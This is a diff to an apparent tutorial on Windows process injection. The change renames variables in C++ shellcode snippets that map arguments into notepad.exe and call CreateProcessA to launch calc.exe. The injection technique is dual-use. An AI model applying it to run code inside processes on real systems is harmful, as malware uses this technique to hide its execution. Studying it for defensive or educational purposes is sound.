@@ -98,12 +98,12 @@ In my PoC, I will target `notepad.exe`. First I will open a handle to victim pro
 
 ### Shellcode
 
-My shellcode is responsible for calling CreateProcessA and launching calculator.exe. I like the way I'm mapping my shellcode because it's a cleaner and more reliable way to execute a payload on a remote target. However, you can't pass arguments directly to the function. You should also map the arguments to the target process and make them accessible to the function, as I did in my proof of concept (PoC)
+My shellcode is responsible for calling CreateProcessA and launching `calculator.exe`. I like the way I'm mapping my shellcode because it's a cleaner and more reliable way to execute a payload on a remote target. However, you can't pass arguments directly to the function. You should also map the arguments to the target process and make them accessible to the function, as I did in my proof of concept (PoC)
 
 ```cpp
 #pragma pack(push, 1)
 struct shellcode_args {
-	char notepad_path[60];
+	char calculator_path[60];
 	STARTUPINFO si;
 	PROCESS_INFORMATION pi;
 	PVOID create_process;
@@ -118,12 +118,12 @@ struct shellcode_args {
 void shellcode() {
 	shellcode_args* args = (shellcode_args*)0xF1F1F1F1F1F1F1F1;
 
-	LPCSTR notepadPath = args->notepad_path;
+	LPCSTR calculatorPath = args->calculator_path;
 	create_process_template f1 = create_process_template(args->create_process);
 	wait_for_single_object_template f2 = wait_for_single_object_template(args->wait_for_single_object);
 	closehandle_template f3 = closehandle_template(args->closehandle);
 
-	f1(notepadPath, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &args->si, &args->pi);
+	f1(calculatorPath, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &args->si, &args->pi);
 
 	f2(args->pi.hProcess, INFINITE);
 	args->completed = TRUE;
@@ -274,7 +274,7 @@ int main()
 	memset(&args, 0, sizeof shellcode_args);
 
 	const char* path_buffer = "C:\\Windows\\System32\\calc.exe";
-	memcpy(args.notepad_path, path_buffer, 60);
+	memcpy(args.calculator_path, path_buffer, 60);
 
 
 
